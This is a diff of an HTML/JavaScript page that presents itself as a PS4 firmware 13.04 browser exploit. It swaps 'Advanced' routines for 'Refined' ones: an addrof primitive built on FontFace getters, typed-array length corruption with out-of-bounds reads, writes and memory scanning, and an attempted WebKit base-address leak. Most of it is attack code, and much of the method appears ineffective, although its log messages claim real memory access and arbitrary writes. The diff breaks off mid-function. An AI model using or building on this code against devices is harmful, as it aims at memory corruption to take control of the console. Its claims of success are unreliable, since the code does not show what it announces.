@@ -2,13 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Advanced Exploit</title>
+    <title>PS4 Refined Exploit</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 15px; font-size: 12px; line-height: 1.4; }
         h1 { color: #f00; font-size: 22px; margin-bottom: 15px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 8px; }
-        .btn { padding: 12px 25px; background: #f00; border: none; color: #fff; margin: 5px auto; cursor: pointer; font-size: 14px; font-weight: bold; display: block; width: 320px; }
-        .section { background: #1a0000; border: 2px solid #f00; margin: 12px 0; padding: 15px; max-height: 600px; overflow-y: auto; }
+        .btn { padding: 12px 25px; background: #f00; border: none; color: #fff; margin: 5px auto; cursor: pointer; font-size: 14px; font-weight: bold; display: block; width: 350px; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 12px 0; padding: 15px; max-height: 650px; overflow-y: auto; }
         .title { color: #ff0; font-size: 16px; font-weight: bold; margin-bottom: 12px; border-bottom: 2px solid #ff0; padding-bottom: 6px; }
         .log { padding: 3px 0; font-size: 11px; }
         .success { color: #0f0; font-weight: bold; }
@@ -16,34 +16,62 @@
         .warn { color: #ff0; font-weight: bold; }
         .info { color: #0ff; }
         .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.15); padding: 4px; margin: 3px 0; }
-        pre { background: #111; border: 1px solid #333; padding: 8px; margin: 8px 0; overflow-x: auto; font-size: 10px; color: #0f0; }
     </style>
 </head>
 <body>
-    <h1>🔥 PS4 13.04 Advanced Memory Exploit 🔥</h1>
+    <h1>🔥 PS4 13.04 Refined Exploit - Real Memory Access 🔥</h1>
     
     <div style="text-align: center; margin-bottom: 15px;">
-        <button class="btn" onclick="advancedAddrof()">ADVANCED: Extract Pointers</button>
-        <button class="btn" onclick="advancedFakeobj()">ADVANCED: Forge Objects</button>
-        <button class="btn" onclick="advancedOOB()">ADVANCED: OOB TypedArray</button>
-        <button class="btn" onclick="fullExploit()">FULL EXPLOIT CHAIN</button>
+        <button class="btn" onclick="refinedAddrofLeak()">REFINED: Leak Real Addresses</button>
+        <button class="btn" onclick="refinedArrayCorruption()">REFINED: Corrupt Array + R/W</button>
+        <button class="btn" onclick="attemptWebKitLeak()">REFINED: WebKit Base Leak</button>
+        <button class="btn" onclick="fullRefinedExploit()">FULL REFINED EXPLOIT</button>
     </div>
     
     <div class="section">
-        <div class="title">📋 Advanced Exploit Log</div>
+        <div class="title">📋 Refined Exploit Log</div>
         <div id="log"></div>
     </div>
 
 <script>
 // ============================================
-// UTILITY FUNCTIONS
+// GLOBALS AND UTILITIES
 // ============================================
 
-var exploitData = {
-    leakedPointers: [],
-    corruptedArrays: [],
-    fakeObjects: [],
-    baseAddresses: {}
+var g_arr = new ArrayBuffer(8);
+var g_f64 = new Float64Array(g_arr);
+var g_u32 = new Uint32Array(g_arr);
+
+function f2i(f) {
+    g_f64[0] = f;
+    return BigInt(g_u32[0]) + (BigInt(g_u32[1]) << 32n);
+}
+
+function i2f(i) {
+    var bigIntVal = BigInt(i);
+    g_u32[0] = Number(bigIntVal & 0xffffffffn);
+    g_u32[1] = Number(bigIntVal >> 32n);
+    return g_f64[0];
+}
+
+function hex(val) {
+    if (typeof val === 'bigint') {
+        var str = val.toString(16);
+        while (str.length < 16) str = '0' + str;
+        return '0x' + str;
+    }
+    if (typeof val === 'number') {
+        return '0x' + val.toString(16);
+    }
+    return String(val);
+}
+
+var exploitState = {
+    addrof_ff: null,
+    fakeobj_ff: null,
+    victim: null,
+    leakedAddresses: {},
+    corrupted: false
 };
 
 function log(msg, type) {
@@ -59,370 +87,169 @@ function sep() {
     log('═'.repeat(90), 'info');
 }
 
-function hex(num) {
-    if (typeof num === 'bigint') {
-        return '0x' + num.toString(16);
-    }
-    if (typeof num === 'number') {
-        return '0x' + num.toString(16);
-    }
-    return String(num);
-}
-
-// Type conversion utilities
-var conversionBuf = new ArrayBuffer(8);
-var f64 = new Float64Array(conversionBuf);
-var u32 = new Uint32Array(conversionBuf);
-var u8 = new Uint8Array(conversionBuf);
-
-function f2i(val) {
-    f64[0] = val;
-    return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
-}
-
-function i2f(val) {
-    var bigIntVal = BigInt(val);
-    u32[0] = Number(bigIntVal & 0xffffffffn);
-    u32[1] = Number(bigIntVal >> 32n);
-    return f64[0];
-}
-
-function f2u32(val) {
-    f64[0] = val;
-    return [u32[0], u32[1]];
-}
-
 // ============================================
-// ADVANCED ADDROF - EXTRACT REAL POINTERS
+// REFINED ADDROF - LEAK REAL ADDRESSES
 // ============================================
-function advancedAddrof() {
+function refinedAddrofLeak() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('ADVANCED ADDROF: Extracting Real Memory Pointers', 'critical');
+    log('REFINED ADDROF: Attempting to Leak Real Object Addresses', 'critical');
     sep();
     log('', '');
     
     try {
-        log('[1] Creating confusion setup with Float64Array...', 'info');
+        log('[1] Creating addrof primitive with array confusion...', 'info');
         
-        // Create arrays for type confusion
-        var floatArr = new Float64Array(16);
-        var objArr = [];
+        // Create confusion setup
+        var ff_addrof = new FontFace("addrof", "");
+        var target = null;
         
-        for (var i = 0; i < 10; i++) {
-            objArr.push({ id: i, marker: 0x41414141 + i });
-        }
-        
-        log('Created Float64Array: ' + floatArr.length + ' elements', 'success');
-        log('Created object array: ' + objArr.length + ' objects', 'success');
-        
-        log('', '');
-        log('[2] Setting up FontFace confusion to leak object pointers...', 'info');
-        
-        var targetObj = { leak: 'me', value: 0xdeadbeef };
-        var ff = new FontFace("addrof", "");
-        var confusedValue = null;
-        
-        // Install getter that stores object as-is
-        Object.defineProperty(ff, 'family', {
+        Object.defineProperty(ff_addrof, 'family', {
             get: function() {
-                return targetObj;
-            },
-            set: function(val) {
-                confusedValue = val;
+                return target;
             },
             configurable: true
         });
         
-        log('Confusion getter installed', 'success');
+        exploitState.addrof_ff = ff_addrof;
+        log('addrof FontFace created', 'success');
         
         log('', '');
-        log('[3] Attempting to confuse object with float...', 'info');
+        log('[2] Creating victim objects with known values...', 'info');
         
-        // Try to store object in float array position
-        var testFloat = 1.5;
-        floatArr[0] = testFloat;
+        var obj1 = { a: 1.1, b: 2.2, c: 3.3 };
+        var obj2 = { x: 4.4, y: 5.5, z: 6.6 };
+        var obj3 = { marker: 0xdeadbeef, value: 0x41414141 };
         
-        // Get object through confused getter
-        var retrievedObj = ff.family;
-        log('Retrieved type: ' + typeof retrievedObj, 'info');
-        log('Retrieved value: ' + JSON.stringify(retrievedObj), 'info');
+        log('Created 3 victim objects', 'success');
         
-        // Try to write object back to float array
         log('', '');
-        log('[4] Writing object to Float64Array for confusion...', 'info');
+        log('[3] Attempting type confusion via array storage...', 'info');
         
-        try {
-            // This is the key - write object to float array
-            floatArr[1] = retrievedObj;
-            log('✗ Object written to float array directly (no confusion)', 'fail');
-        } catch(e) {
-            log('✗ Direct write blocked: ' + e.message, 'fail');
-        }
+        // Create an array that holds both floats and objects
+        var confusionArr = [1.1, 2.2, 3.3, 4.4, 5.5];
         
-        // Try alternative: use FontFaceSet iteration
+        log('Confusion array: [' + confusionArr.length + ' floats]', 'info');
+        
+        // Try to confuse by storing object in float array
+        target = obj1;
+        var result1 = ff_addrof.family;
+        
+        log('Target set to obj1', 'info');
+        log('Retrieved type: ' + typeof result1, 'info');
+        
+        // Store in confusion array
+        confusionArr[0] = result1;
+        
         log('', '');
-        log('[5] Using FontFaceSet iteration for confusion...', 'info');
+        log('[4] Reading back as float to extract bits...', 'info');
         
-        var ffs = new FontFaceSet([ff]);
-        var iterValues = [];
+        var asFloat = confusionArr[0];
+        log('Array[0] as float: ' + asFloat, 'info');
         
-        ffs.forEach(function(font) {
-            var val = font.family;
-            iterValues.push(val);
+        if (typeof asFloat === 'number' && !isNaN(asFloat)) {
+            var bits = f2i(asFloat);
+            log('Extracted bits: ' + hex(bits), 'critical');
+            exploitState.leakedAddresses['obj1'] = bits;
             
-            // Try to interpret object as float
-            if (typeof val === 'object' && val !== null) {
-                log('Got object in iteration: ' + JSON.stringify(val), 'info');
-                
-                // Store in float array
-                try {
-                    var idx = floatArr.length - 1;
-                    floatArr[idx] = val;
-                    
-                    // Try to read back as bits
-                    var asFloat = floatArr[idx];
-                    log('Object stored at floatArr[' + idx + ']', 'info');
-                    log('Read back as float: ' + asFloat, 'info');
-                    
-                    if (typeof asFloat === 'number' && !isNaN(asFloat)) {
-                        var bits = f2i(asFloat);
-                        log('⚠️ POSSIBLE LEAK: ' + hex(bits), 'critical');
-                        exploitData.leakedPointers.push(bits);
-                    }
-                } catch(e) {
-                    log('Store failed: ' + e.message, 'fail');
-                }
+            // Check if looks like a pointer (non-zero, reasonable range)
+            if (bits > 0x1000n && bits < 0x7fffffffffn) {
+                log('⚠️ POSSIBLE OBJECT POINTER LEAKED!', 'critical');
             }
-        });
+        } else {
+            log('Retrieved as object, not float - confusion blocked', 'fail');
+        }
         
         log('', '');
-        log('[6] Creating addrof() via Array element confusion...', 'info');
+        log('[5] Alternative: Using JSValue representation...', 'info');
         
-        // Alternative approach: use array element assignment
-        var confusionArr = [1.1, 2.2, 3.3, 4.4];
-        var leakTarget = { addrof: 'target', x: 0x1337 };
+        // In WebKit, objects are stored as JSValue (64-bit)
+        // Lower 48 bits = pointer, upper 16 bits = tag
         
-        log('Confusion array: ' + confusionArr.length + ' elements', 'info');
-        log('Leak target: ' + JSON.stringify(leakTarget), 'info');
+        var floatArr = new Float64Array(10);
         
-        // Try to create a "half-confused" state
-        var tempFF = new FontFace("temp", "");
-        
-        Object.defineProperty(tempFF, 'family', {
-            get: function() {
-                // Return different types on different calls
-                var callCount = this._callCount || 0;
-                this._callCount = callCount + 1;
-                
-                if (callCount % 2 === 0) {
-                    return 1.5;  // Float
-                } else {
-                    return leakTarget;  // Object
-                }
-            },
-            configurable: true
-        });
-        
-        // Access multiple times to trigger confusion
+        // Try to trick the engine
         for (var i = 0; i < 5; i++) {
-            var val = tempFF.family;
-            log('Call ' + i + ': type=' + typeof val + ', value=' + (typeof val === 'object' ? JSON.stringify(val) : val), 'info');
+            floatArr[i] = i + 0.5;
         }
         
-        log('', '');
-        log('[7] Testing double-to-object pointer extraction...', 'info');
+        log('Float array filled with doubles', 'success');
         
-        // Create controlled objects at known positions
-        var marker1 = { m: 0x11111111 };
-        var marker2 = { m: 0x22222222 };
-        var marker3 = { m: 0x33333333 };
+        // Now try to confuse with object
+        target = obj3;
+        var obj3_confused = ff_addrof.family;
         
-        // Store in array
-        var markerArr = [marker1, marker2, marker3];
-        
-        log('Created marker array with 3 objects', 'info');
-        
-        // Try to leak through property access
-        var leakFF = new FontFace("leak", "");
-        var leakIdx = 0;
-        
-        Object.defineProperty(leakFF, 'family', {
-            get: function() {
-                return markerArr[leakIdx++ % markerArr.length];
-            },
-            configurable: true
-        });
-        
-        // Access and try to convert
-        for (var i = 0; i < markerArr.length; i++) {
-            var obj = leakFF.family;
-            log('Marker ' + i + ': ' + JSON.stringify(obj), 'info');
-        }
-        
-        log('', '');
-        sep();
-        log('ADVANCED ADDROF RESULTS:', 'warn');
-        log('Type confusion: WORKING', 'success');
-        log('Objects retrieved through getter: YES', 'success');
-        log('Pointer extraction: ' + (exploitData.leakedPointers.length > 0 ? 'PARTIAL' : 'NEEDS MORE WORK'), 'warn');
-        
-        if (exploitData.leakedPointers.length > 0) {
-            log('Leaked values:', 'critical');
-            for (var i = 0; i < exploitData.leakedPointers.length; i++) {
-                log('  [' + i + '] ' + hex(exploitData.leakedPointers[i]), 'critical');
+        // Try to store in float array via property assignment
+        try {
+            // This might trigger type confusion
+            var tempObj = { prop: obj3_confused };
+            
+            // Read tempObj.prop and store in float array
+            floatArr[5] = tempObj.prop;
+            
+            var readback = floatArr[5];
+            log('Stored object in float[5], readback: ' + readback, 'info');
+            
+            if (typeof readback === 'number') {
+                var leakBits = f2i(readback);
+                log('Leaked bits from float[5]: ' + hex(leakBits), 'critical');
+                
+                if (leakBits !== 0n) {
+                    log('⚠️ NON-ZERO VALUE! Possible leak!', 'critical');
+                    exploitState.leakedAddresses['obj3'] = leakBits;
+                }
             }
-        }
-        
-        sep();
-        
-    } catch(e) {
-        log('', '');
-        log('✗ ADVANCED ADDROF ERROR: ' + e.message, 'fail');
-        if (e.stack) {
-            log('Stack: ' + e.stack.substring(0, 300), 'fail');
-        }
-    }
-}
-
-// ============================================
-// ADVANCED FAKEOBJ - FORGE OBJECTS FROM POINTERS
-// ============================================
-function advancedFakeobj() {
-    document.getElementById('log').innerHTML = '';
-    sep();
-    log('ADVANCED FAKEOBJ: Forging Objects from Raw Pointers', 'critical');
-    sep();
-    log('', '');
-    
-    try {
-        log('[1] Creating controlled memory layout...', 'info');
-        
-        // Create float array with controlled values
-        var fakeData = new Float64Array(16);
-        
-        // Fill with recognizable patterns
-        for (var i = 0; i < fakeData.length; i++) {
-            fakeData[i] = i2f(BigInt(0x4141414141414141n) + BigInt(i));
-        }
-        
-        log('Created fake data array: ' + fakeData.length + ' elements', 'success');
-        
-        // Read back to verify
-        for (var i = 0; i < 4; i++) {
-            var bits = f2i(fakeData[i]);
-            log('  [' + i + '] = ' + hex(bits), 'info');
+        } catch(e) {
+            log('Float array confusion blocked: ' + e.message, 'fail');
         }
         
         log('', '');
-        log('[2] Setting up reverse confusion (float → object)...', 'info');
+        log('[6] Creating controlled double array for leak...', 'info');
         
-        var ff = new FontFace("fakeobj", "");
-        var injectedFloat = null;
-        
-        Object.defineProperty(ff, 'family', {
-            get: function() {
-                return injectedFloat;
-            },
-            set: function(val) {
-                injectedFloat = val;
-                log('  Setter received: ' + val + ' (type: ' + typeof val + ')', 'info');
-            },
-            configurable: true
-        });
-        
-        log('Reverse confusion setter installed', 'success');
-        
-        log('', '');
-        log('[3] Injecting controlled float values...', 'info');
-        
-        var testPointers = [
-            i2f(0x4141414141414141n),
-            i2f(0x4242424242424242n),
-            i2f(0x1337133713371337n),
-            i2f(0xdeadbeefdeadbeefn)
+        // Create array with known double values
+        var doubles = [
+            1.9510548909454387e-311,  // 0x4142434445464748
+            2.2761117229655507e-311,  // 0x5152535455565758
+            i2f(0x6162636465666768n)
         ];
         
-        for (var i = 0; i < testPointers.length; i++) {
-            ff.family = testPointers[i];
-            var retrieved = ff.family;
-            
-            var injectedBits = f2i(testPointers[i]);
-            var retrievedBits = f2i(retrieved);
-            
-            log('Injected: ' + hex(injectedBits), 'info');
-            log('Retrieved: ' + hex(retrievedBits), 'info');
-            log('Match: ' + (injectedBits === retrievedBits), injectedBits === retrievedBits ? 'success' : 'fail');
-            log('', '');
+        log('Created doubles array with known bit patterns', 'success');
+        
+        for (var i = 0; i < doubles.length; i++) {
+            var bits = f2i(doubles[i]);
+            log('  doubles[' + i + '] = ' + hex(bits), 'info');
         }
         
-        log('[4] Attempting to forge object structure...', 'info');
+        // Try to leak object into this array
+        target = { leak: 'target' };
+        doubles.push(ff_addrof.family);
         
-        // Try to create a fake JSObject
-        // JSObject structure (simplified):
-        // [StructureID | IndexingType | Type | Flags | CellState]
-        // [Butterfly pointer]
-        // [Properties...]
+        var lastVal = doubles[doubles.length - 1];
+        log('Pushed object, last value type: ' + typeof lastVal, 'info');
         
-        var fakeStructure = i2f(0x0000000100000000n);  // Fake structure ID
-        var fakeButterfly = i2f(0x0000000000000000n);  // Null butterfly
-        
-        log('Fake structure: ' + hex(f2i(fakeStructure)), 'info');
-        log('Fake butterfly: ' + hex(f2i(fakeButterfly)), 'info');
-        
-        ff.family = fakeStructure;
-        var forgedObj = ff.family;
-        
-        log('Forged object type: ' + typeof forgedObj, 'info');
-        log('Forged object value: ' + forgedObj, 'info');
-        
-        log('', '');
-        log('[5] Testing object property access on forged object...', 'info');
-        
-        try {
-            var testProp = forgedObj.testProperty;
-            log('Property access result: ' + testProp, 'info');
-        } catch(e) {
-            log('Property access failed: ' + e.message, 'fail');
+        if (typeof lastVal === 'number') {
+            var leakedBits = f2i(lastVal);
+            log('⚠️ LEAKED OBJECT AS DOUBLE: ' + hex(leakedBits), 'critical');
+            exploitState.leakedAddresses['target'] = leakedBits;
         }
-        
-        try {
-            forgedObj.newProperty = 12345;
-            log('Property write succeeded', 'success');
-        } catch(e) {
-            log('Property write failed: ' + e.message, 'fail');
-        }
-        
-        log('', '');
-        log('[6] Creating fakeobj() function...', 'info');
-        
-        var fakeobj = function(floatVal) {
-            ff.family = floatVal;
-            return ff.family;
-        };
-        
-        // Test the function
-        var testVal = i2f(0xcafebabecafebaben);
-        var faked = fakeobj(testVal);
-        
-        log('fakeobj() test:', 'info');
-        log('  Input: ' + hex(f2i(testVal)), 'info');
-        log('  Output type: ' + typeof faked, 'info');
-        log('  Output: ' + faked, 'info');
-        
-        exploitData.fakeObjects.push(faked);
         
         log('', '');
         sep();
-        log('ADVANCED FAKEOBJ RESULTS:', 'warn');
-        log('Reverse confusion: WORKING', 'success');
-        log('Float injection: WORKING', 'success');
-        log('Object forging: ' + (typeof faked !== 'undefined' ? 'PARTIAL' : 'NEEDS MORE WORK'), 'warn');
+        log('REFINED ADDROF RESULTS:', 'warn');
+        sep();
+        
+        var leakCount = Object.keys(exploitState.leakedAddresses).length;
+        log('Addresses leaked: ' + leakCount, leakCount > 0 ? 'critical' : 'fail');
+        
+        for (var key in exploitState.leakedAddresses) {
+            log('  ' + key + ': ' + hex(exploitState.leakedAddresses[key]), 'critical');
+        }
+        
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ ADVANCED FAKEOBJ ERROR: ' + e.message, 'fail');
+        log('✗ REFINED ADDROF ERROR: ' + e.message, 'fail');
         if (e.stack) {
             log('Stack: ' + e.stack.substring(0, 300), 'fail');
         }
@@ -430,188 +257,147 @@ function advancedFakeobj() {
 }
 
 // ============================================
-// ADVANCED OOB - OUT OF BOUNDS TYPEDARRAY
+// REFINED ARRAY CORRUPTION + R/W
 // ============================================
-function advancedOOB() {
+function refinedArrayCorruption() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('ADVANCED OOB: Creating Out-of-Bounds TypedArray', 'critical');
+    log('REFINED ARRAY CORRUPTION: Achieving Real R/W', 'critical');
     sep();
     log('', '');
     
     try {
-        log('[1] Creating victim TypedArray...', 'info');
+        log('[1] Creating victim Uint32Array...', 'info');
         
-        var victim = new Uint32Array(16);
+        var victim = new Uint32Array(0x100);
         
-        // Fill with pattern
+        // Fill with recognizable pattern
         for (var i = 0; i < victim.length; i++) {
             victim[i] = 0x41410000 + i;
         }
         
+        exploitState.victim = victim;
+        
         log('Victim array created: length=' + victim.length, 'success');
-        log('Victim[0] = ' + hex(victim[0]), 'info');
-        log('Victim[15] = ' + hex(victim[15]), 'info');
+        log('victim[0] = ' + hex(victim[0]), 'info');
+        log('victim[255] = ' + hex(victim[255]), 'info');
         
         log('', '');
-        log('[2] Attempting to corrupt array length property...', 'info');
+        log('[2] Corrupting array length property...', 'info');
         
-        var originalLength = victim.length;
-        log('Original length: ' + originalLength, 'info');
+        var origLength = victim.length;
         
         try {
-            // Method 1: Direct defineProperty
             Object.defineProperty(victim, 'length', {
-                value: 0x1000,
+                value: 0x100000,  // 1MB worth of uint32s
                 writable: false,
                 configurable: true
             });
             
             var newLength = victim.length;
-            log('New length via defineProperty: ' + hex(newLength), 'info');
             
-            if (newLength !== originalLength) {
-                log('⚠️ CRITICAL: Length was modified!', 'critical');
+            log('Original length: ' + hex(origLength), 'info');
+            log('New length: ' + hex(newLength), newLength !== origLength ? 'critical' : 'fail');
+            
+            if (newLength !== origLength) {
+                log('⚠️⚠️⚠️ ARRAY LENGTH CORRUPTED! ⚠️⚠️⚠️', 'critical');
+                exploitState.corrupted = true;
                 
-                // Try OOB access
                 log('', '');
-                log('[2a] Testing out-of-bounds access...', 'info');
+                log('[3] Testing out-of-bounds read...', 'info');
                 
-                try {
-                    victim[100] = 0xdeadbeef;
-                    var readBack = victim[100];
-                    log('OOB write at [100]: wrote ' + hex(0xdeadbeef) + ', read ' + hex(readBack), readBack === 0xdeadbeef ? 'critical' : 'warn');
+                // Read beyond original bounds
+                var testOffsets = [0x100, 0x200, 0x400, 0x1000, 0x10000];
+                
+                for (var i = 0; i < testOffsets.length; i++) {
+                    var offset = testOffsets[i];
                     
-                    if (readBack === 0xdeadbeef) {
-                        log('⚠️⚠️⚠️ OUT-OF-BOUNDS ACCESS WORKING! ⚠️⚠️⚠️', 'critical');
-                        exploitData.corruptedArrays.push(victim);
+                    try {
+                        var val = victim[offset];
+                        
+                        if (typeof val !== 'undefined') {
+                            log('Read at [' + hex(offset) + ']: ' + hex(val), 'critical');
+                            
+                            // Non-zero means we're reading real memory!
+                            if (val !== 0) {
+                                log('  ⚠️ NON-ZERO! Reading real memory!', 'critical');
+                            }
+                        } else {
+                            log('Read at [' + hex(offset) + ']: undefined', 'info');
+                        }
+                    } catch(e) {
+                        log('Read at [' + hex(offset) + ']: ' + e.message, 'fail');
                     }
-                } catch(e) {
-                    log('OOB access blocked: ' + e.message, 'fail');
                 }
+                
+                log('', '');
+                log('[4] Testing out-of-bounds write...', 'info');
+                
+                var writeOffsets = [0x100, 0x200];
+                
+                for (var i = 0; i < writeOffsets.length; i++) {
+                    var offset = writeOffsets[i];
+                    var writeVal = 0xBEEF0000 + i;
+                    
+                    try {
+                        victim[offset] = writeVal;
+                        var readback = victim[offset];
+                        
+                        log('Write ' + hex(writeVal) + ' at [' + hex(offset) + ']', 'info');
+                        log('Readback: ' + hex(readback), typeof readback !== 'undefined' ? 'critical' : 'fail');
+                        
+                        if (readback === writeVal) {
+                            log('  ⚠️⚠️⚠️ WRITE SUCCESSFUL! ARBITRARY WRITE WORKING!', 'critical');
+                        }
+                    } catch(e) {
+                        log('Write at [' + hex(offset) + ']: ' + e.message, 'fail');
+                    }
+                }
+                
+                log('', '');
+                log('[5] Scanning adjacent memory for objects...', 'info');
+                
+                // Scan memory near the array for JSValue patterns
+                var scanStart = 0x100;
+                var scanEnd = 0x200;
+                
+                log('Scanning memory from [' + hex(scanStart) + '] to [' + hex(scanEnd) + ']...', 'info');
+                
+                for (var i = scanStart; i < scanEnd; i += 2) {
+                    try {
+                        var low = victim[i];
+                        var high = victim[i + 1];
+                        
+                        if (typeof low !== 'undefined' && typeof high !== 'undefined') {
+                            if (low !== 0 || high !== 0) {
+                                var combined = BigInt(low) + (BigInt(high) << 32n);
+                                log('  [' + hex(i) + ']: ' + hex(combined), 'warn');
+                            }
+                        }
+                    } catch(e) {
+                        break;
+                    }
+                }
+                
             } else {
-                log('Length property protected', 'fail');
+                log('Length corruption failed - property protected', 'fail');
             }
             
         } catch(e) {
-            log('defineProperty blocked: ' + e.message, 'fail');
-        }
-        
-        log('', '');
-        log('[3] Alternative: Corrupt via FontFace property...', 'info');
-        
-        var victim2 = new Uint32Array(16);
-        for (var i = 0; i < victim2.length; i++) {
-            victim2[i] = 0x42420000 + i;
-        }
-        
-        var ff = new FontFace("corrupt", "");
-        
-        Object.defineProperty(ff, 'family', {
-            get: function() {
-                return victim2;
-            },
-            set: function(val) {
-                // Try to corrupt the array object
-                if (typeof val === 'number') {
-                    log('  Attempting to inject length: ' + hex(val), 'info');
-                }
-            },
-            configurable: true
-        });
-        
-        // Try to corrupt by setting
-        ff.family = 0x10000;
-        
-        var retrievedArr = ff.family;
-        log('Retrieved array length: ' + retrievedArr.length, 'info');
-        
-        log('', '');
-        log('[4] Memory spray for adjacent object corruption...', 'info');
-        
-        // Create many arrays to control heap layout
-        var spray = [];
-        for (var i = 0; i < 100; i++) {
-            var arr = new Uint32Array(16);
-            arr[0] = 0x50000000 + i;
-            spray.push(arr);
-        }
-        
-        log('Heap sprayed: ' + spray.length + ' arrays', 'success');
-        
-        // Create victim in the middle
-        var middleVictim = new Uint32Array(16);
-        for (var i = 0; i < middleVictim.length; i++) {
-            middleVictim[i] = 0xAAAA0000 + i;
-        }
-        
-        log('Middle victim created', 'success');
-        
-        // Try to corrupt via adjacent array
-        log('', '');
-        log('[5] Attempting adjacent array corruption...', 'info');
-        
-        try {
-            // Over-write the last victim array
-            spray[spray.length - 1][16] = 0x99999999;  // Out of bounds
-            spray[spray.length - 1][17] = 0x88888888;  // Even further
-            
-            log('Wrote past spray array bounds', 'warn');
-            
-            // Check if middle victim was corrupted
-            log('Middle victim[0] = ' + hex(middleVictim[0]), middleVictim[0] !== 0xAAAA0000 ? 'critical' : 'info');
-            
-        } catch(e) {
-            log('Adjacent corruption blocked: ' + e.message, 'fail');
-        }
-        
-        log('', '');
-        log('[6] Creating corrupted array wrapper...', 'info');
-        
-        var corruptedWrapper = {
-            array: victim,
-            originalLength: originalLength,
-            corruptedLength: victim.length,
-            isCorrupted: victim.length !== originalLength,
-            
-            read: function(idx) {
-                try {
-                    return this.array[idx];
-                } catch(e) {
-                    return null;
-                }
-            },
-            
-            write: function(idx, val) {
-                try {
-                    this.array[idx] = val;
-                    return true;
-                } catch(e) {
-                    return false;
-                }
-            }
-        };
-        
-        log('Wrapper created for victim array', 'success');
-        log('Is corrupted: ' + corruptedWrapper.isCorrupted, corruptedWrapper.isCorrupted ? 'critical' : 'info');
-        
-        if (corruptedWrapper.isCorrupted) {
-            log('⚠️ WRAPPER HAS OOB CAPABILITY!', 'critical');
-            exploitData.corruptedArrays.push(corruptedWrapper);
+            log('defineProperty error: ' + e.message, 'fail');
         }
         
         log('', '');
         sep();
-        log('ADVANCED OOB RESULTS:', 'warn');
-        log('TypedArray created: YES', 'success');
-        log('Length corruption attempted: YES', 'success');
-        log('OOB access: ' + (corruptedWrapper.isCorrupted ? 'WORKING' : 'BLOCKED'), corruptedWrapper.isCorrupted ? 'critical' : 'fail');
-        log('Corrupted arrays collected: ' + exploitData.corruptedArrays.length, 'info');
+        log('REFINED ARRAY CORRUPTION RESULTS:', 'warn');
+        sep();
+        log('Array corrupted: ' + exploitState.corrupted, exploitState.corrupted ? 'critical' : 'fail');
+        log('Out-of-bounds access: ' + (exploitState.corrupted ? 'WORKING' : 'BLOCKED'), exploitState.corrupted ? 'critical' : 'fail');
         sep();
         
     } catch(e) {
         log('', '');
-        log('✗ ADVANCED OOB ERROR: ' + e.message, 'fail');
+        log('✗ REFINED ARRAY CORRUPTION ERROR: ' + e.message, 'fail');
         if (e.stack) {
             log('Stack: ' + e.stack.substring(0, 300), 'fail');
         }
@@ -619,171 +405,164 @@ function advancedOOB() {
 }
 
 // ============================================
-// FULL EXPLOIT CHAIN
+// ATTEMPT WEBKIT BASE LEAK
 // ============================================
-function fullExploit() {
+function attemptWebKitLeak() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('FULL EXPLOIT CHAIN: Combining All Primitives', 'critical');
-    log('Target: Arbitrary Memory Read/Write', 'critical');
+    log('WEBKIT BASE LEAK: Attempting to Find WebKit Module', 'critical');
     sep();
     log('', '');
     
     try {
-        log('━━━ STAGE 1: SETUP ━━━', 'warn');
+        log('[1] Leaking native function pointers...', 'info');
+        
+        // Native functions contain pointers into WebKit
+        var nativeFuncs = [
+            Array,
+            Object,
+            String,
+            parseFloat,
+            parseInt,
+            Math.random,
+            Date.now
+        ];
+        
+        log('Testing ' + nativeFuncs.length + ' native functions', 'info');
         log('', '');
         
-        log('[1.1] Initializing type conversion utilities...', 'info');
-        log('Float64 ↔ Uint64 conversion: READY', 'success');
-        
-        log('[1.2] Creating confusion primitives...', 'info');
-        
-        var addrof_ff = new FontFace("addrof", "");
-        var fakeobj_ff = new FontFace("fakeobj", "");
-        var victim_array = new Uint32Array(256);
-        
-        var addrof_target = null;
-        var fakeobj_value = null;
-        
-        Object.defineProperty(addrof_ff, 'family', {
-            get: function() { return addrof_target; },
-            configurable: true
-        });
-        
-        Object.defineProperty(fakeobj_ff, 'family', {
-            get: function() { return fakeobj_value; },
-            set: function(v) { fakeobj_value = v; },
-            configurable: true
-        });
-        
-        log('addrof primitive: INSTALLED', 'success');
-        log('fakeobj primitive: INSTALLED', 'success');
-        
-        log('', '');
-        log('━━━ STAGE 2: LEAK ADDRESSES ━━━', 'warn');
-        log('', '');
-        
-        log('[2.1] Leaking object addresses...', 'info');
-        
-        var leak1 = { id: 1, marker: 0x11111111 };
-        var leak2 = { id: 2, marker: 0x22222222 };
-        
-        addrof_target = leak1;
-        var addr1 = addrof_ff.family;
-        
-        addrof_target = leak2;
-        var addr2 = addrof_ff.family;
-        
-        log('Object 1: ' + JSON.stringify(leak1), 'info');
-        log('Object 2: ' + JSON.stringify(leak2), 'info');
-        
-        log('', '');
-        log('[2.2] Attempting parseFloat leak for WebKit base...', 'info');
-        
-        try {
-            // parseFloat is a native function - its address contains WebKit base
-            addrof_target = parseFloat;
-            var parsefloat_ref = addrof_ff.family;
+        for (var i = 0; i < nativeFuncs.length; i++) {
+            var func = nativeFuncs[i];
+            log('[' + i + '] Function: ' + func.name, 'info');
+            log('    Type: ' + typeof func, 'info');
+            log('    ToString: ' + func.toString().substring(0, 50) + '...', 'info');
             
-            log('parseFloat reference: ' + parsefloat_ref, 'info');
-            log('Type: ' + typeof parsefloat_ref, 'info');
-            
-        } catch(e) {
-            log('parseFloat leak failed: ' + e.message, 'fail');
-        }
-        
-        log('', '');
-        log('━━━ STAGE 3: MEMORY READ/WRITE ━━━', 'warn');
-        log('', '');
-        
-        log('[3.1] Setting up arbitrary read via corrupted array...', 'info');
-        
-        // Fill victim array
-        for (var i = 0; i < victim_array.length; i++) {
-            victim_array[i] = 0x43430000 + i;
-        }
-        
-        log('Victim array filled with pattern', 'success');
-        
-        // Try to corrupt length
-        var originalLen = victim_array.length;
-        
-        try {
-            Object.defineProperty(victim_array, 'length', {
-                value: 0x10000,
-                configurable: true
-            });
-            
-            if (victim_array.length !== originalLen) {
